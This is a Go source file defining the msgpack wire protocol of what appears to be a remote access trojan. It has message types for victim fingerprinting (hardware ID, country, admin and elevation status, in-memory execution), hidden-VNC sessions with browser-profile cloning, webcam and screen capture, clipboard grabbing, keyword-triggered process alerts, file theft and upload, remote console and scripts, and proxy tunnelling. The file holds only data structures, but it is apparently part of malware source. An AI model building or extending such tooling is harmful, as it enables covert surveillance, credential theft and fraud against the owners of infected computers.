package wire

type Hello struct {
	Type        string          `msgpack:"type"`
	ID          string          `msgpack:"id"`
	HWID        string          `msgpack:"hwid"`
	Host        string          `msgpack:"host"`
	OS          string          `msgpack:"os"`
	Arch        string          `msgpack:"arch"`
	Version     string          `msgpack:"version"`
	User        string          `msgpack:"user"`
	Monitors    int             `msgpack:"monitors"`
	MonitorInfo []MonitorInfo   `msgpack:"monitorInfo,omitempty"`
	Country     string          `msgpack:"country,omitempty"`
	BuildTag    string          `msgpack:"buildTag,omitempty"`
	PublicKey   string          `msgpack:"publicKey,omitempty"`
	Signature   string          `msgpack:"signature,omitempty"`
	InMemory    bool            `msgpack:"inMemory,omitempty"`
	CPU         string          `msgpack:"cpu,omitempty"`
	GPU         string          `msgpack:"gpu,omitempty"`
	RAM         string          `msgpack:"ram,omitempty"`
	IsAdmin     bool            `msgpack:"isAdmin,omitempty"`
	Elevation   string          `msgpack:"elevation,omitempty"`
	Permissions map[string]bool `msgpack:"permissions,omitempty"`
}

type EnrollmentChallenge struct {
	Type  string `msgpack:"type"`
	Nonce string `msgpack:"nonce"`
}

type EnrollmentStatus struct {
	Type   string `msgpack:"type"`
	Status string `msgpack:"status"`
}

type MonitorInfo struct {
	Width  int `msgpack:"width"`
	Height int `msgpack:"height"`
}

type Ping struct {
	Type string `msgpack:"type"`
	TS   int64  `msgpack:"ts,omitempty"`
}

type Pong struct {
	Type string `msgpack:"type"`
	TS   int64  `msgpack:"ts,omitempty"`
}

type Command struct {
	Type        string      `msgpack:"type"`
	CommandType string      `msgpack:"commandType"`
	Payload     interface{} `msgpack:"payload,omitempty"`
	ID          string      `msgpack:"id,omitempty"`
}

type CommandResult struct {
	Type      string `msgpack:"type"`
	CommandID string `msgpack:"commandId,omitempty"`
	OK        bool   `msgpack:"ok"`
	Message   string `msgpack:"message,omitempty"`
}

type FrameHeader struct {
	Monitor int    `msgpack:"monitor"`
	FPS     int    `msgpack:"fps"`
	Format  string `msgpack:"format"`
	HVNC    bool   `msgpack:"hvnc,omitempty"`
	Webcam  bool   `msgpack:"webcam,omitempty"`
}

type Frame struct {
	Type   string      `msgpack:"type"`
	Header FrameHeader `msgpack:"header"`
	Data   []byte      `msgpack:"data"`
}

type FrameAck struct {
	Type string `msgpack:"type"`
}

type ScreenshotResult struct {
	Type      string `msgpack:"type"`
	CommandID string `msgpack:"commandId,omitempty"`
	Format    string `msgpack:"format"`
	Width     int    `msgpack:"width,omitempty"`
	Height    int    `msgpack:"height,omitempty"`
	Data      []byte `msgpack:"data"`
	Error     string `msgpack:"error,omitempty"`
}

type ConsoleOutput struct {
	Type      string `msgpack:"type"`
	SessionID string `msgpack:"sessionId"`
	Data      []byte `msgpack:"data,omitempty"`
	ExitCode  *int   `msgpack:"exitCode,omitempty"`
	Error     string `msgpack:"error,omitempty"`
}

type FileEntry struct {
	Name    string `msgpack:"name"`
	Path    string `msgpack:"path"`
	IsDir   bool   `msgpack:"isDir"`
	Size    int64  `msgpack:"size"`
	ModTime int64  `msgpack:"modTime"`
	Mode    string `msgpack:"mode,omitempty"`
	Owner   string `msgpack:"owner,omitempty"`
	Group   string `msgpack:"group,omitempty"`
}

type FileListResult struct {
	Type      string      `msgpack:"type"`
	CommandID string      `msgpack:"commandId,omitempty"`
	Path      string      `msgpack:"path"`
	Entries   []FileEntry `msgpack:"entries"`
	Error     string      `msgpack:"error,omitempty"`
}

type FileDownload struct {
	Type        string `msgpack:"type"`
	CommandID   string `msgpack:"commandId,omitempty"`
	Path        string `msgpack:"path"`
	Data        []byte `msgpack:"data"`
	Offset      int64  `msgpack:"offset"`
	Total       int64  `msgpack:"total"`
	ChunkIndex  int    `msgpack:"chunkIndex,omitempty"`
	ChunksTotal int    `msgpack:"chunksTotal,omitempty"`
	Error       string `msgpack:"error,omitempty"`
}

type FileUploadResult struct {
	Type       string `msgpack:"type"`
	CommandID  string `msgpack:"commandId,omitempty"`
	TransferID string `msgpack:"transferId,omitempty"`
	Path       string `msgpack:"path"`
	OK         bool   `msgpack:"ok"`
	Offset     int64  `msgpack:"offset,omitempty"`
	Size       int64  `msgpack:"size,omitempty"`
	Received   int64  `msgpack:"received,omitempty"`
	Total      int64  `msgpack:"total,omitempty"`
	Error      string `msgpack:"error,omitempty"`
}

type ProcessInfo struct {
	PID      int32   `msgpack:"pid"`
	PPID     int32   `msgpack:"ppid"`
	Name     string  `msgpack:"name"`
	CPU      float64 `msgpack:"cpu"`
	Memory   uint64  `msgpack:"memory"`
	Username string  `msgpack:"username,omitempty"`
	Type     string  `msgpack:"type,omitempty"`
}

type ProcessListResult struct {
	Type      string        `msgpack:"type"`
	CommandID string        `msgpack:"commandId,omitempty"`
	Processes []ProcessInfo `msgpack:"processes"`
	Error     string        `msgpack:"error,omitempty"`
}

type FileReadResult struct {
	Type      string `msgpack:"type"`
	CommandID string `msgpack:"commandId,omitempty"`
	Path      string `msgpack:"path"`
	Content   string `msgpack:"content"`
	IsBinary  bool   `msgpack:"isBinary"`
	Error     string `msgpack:"error,omitempty"`
}

type FileSearchMatch struct {
	Path  string `msgpack:"path"`
	Line  int    `msgpack:"line,omitempty"`
	Match string `msgpack:"match,omitempty"`
}

type FileSearchResult struct {
	Type      string            `msgpack:"type"`
	CommandID string            `msgpack:"commandId,omitempty"`
	SearchID  string            `msgpack:"searchId"`
	Results   []FileSearchMatch `msgpack:"results"`
	Complete  bool              `msgpack:"complete"`
	Error     string            `msgpack:"error,omitempty"`
}

type ScriptResult struct {
	Type      string `msgpack:"type"`
	CommandID string `msgpack:"commandId,omitempty"`
	OK        bool   `msgpack:"ok"`
	Output    string `msgpack:"output"`
	Error     string `msgpack:"error,omitempty"`
}

type PluginEvent struct {
	Type     string      `msgpack:"type"`
	PluginID string      `msgpack:"pluginId"`
	Event    string      `msgpack:"event"`
	Payload  interface{} `msgpack:"payload,omitempty"`
	Error    string      `msgpack:"error,omitempty"`
}

type Notification struct {
	Type        string `msgpack:"type"`
	Category    string `msgpack:"category"`
	Title       string `msgpack:"title"`
	Process     string `msgpack:"process,omitempty"`
	ProcessPath string `msgpack:"processPath,omitempty"`
	PID         int32  `msgpack:"pid,omitempty"`
	Keyword     string `msgpack:"keyword,omitempty"`
	TS          int64  `msgpack:"ts,omitempty"`
}

type WebcamDevice struct {
	Index  int    `msgpack:"index"`
	Name   string `msgpack:"name"`
	MaxFPS int    `msgpack:"maxFps,omitempty"`
}

type WebcamDevices struct {
	Type     string         `msgpack:"type"`
	Devices  []WebcamDevice `msgpack:"devices"`
	Selected int            `msgpack:"selected"`
}

type HVNCCloneProgress struct {
	Type        string `msgpack:"type"`
	Browser     string `msgpack:"browser"`
	Percent     int    `msgpack:"percent"`
	CopiedBytes int64  `msgpack:"copiedBytes"`
	TotalBytes  int64  `msgpack:"totalBytes"`
	Status      string `msgpack:"status"`
}

type HVNCDXGIStatus struct {
	Type    string `msgpack:"type"`
	Success bool   `msgpack:"success"`
	GPUPid  uint32 `msgpack:"gpuPid"`
	Message string `msgpack:"message"`
}

type HVNCLookupResult struct {
	Type string `msgpack:"type"`
	Exe  string `msgpack:"exe"`
	Path string `msgpack:"path"`
	Done bool   `msgpack:"done"`
}

type ClipboardContent struct {
	Type   string `msgpack:"type"`
	Text   string `msgpack:"text"`
	Source string `msgpack:"source"`
}

type ProxyData struct {
	Type         string `msgpack:"type"`
	ConnectionID string `msgpack:"connectionId"`
	Data         []byte `msgpack:"data"`
}

type ProxyClose struct {
	Type         string `msgpack:"type"`
	ConnectionID string `msgpack:"connectionId"`
}

type DisconnectInfo struct {
	Type   string `msgpack:"type"`
	Reason string `msgpack:"reason"`           // "normal", "panic", "crash", "network", "timeout"
	Detail string `msgpack:"detail,omitempty"` // error message
}
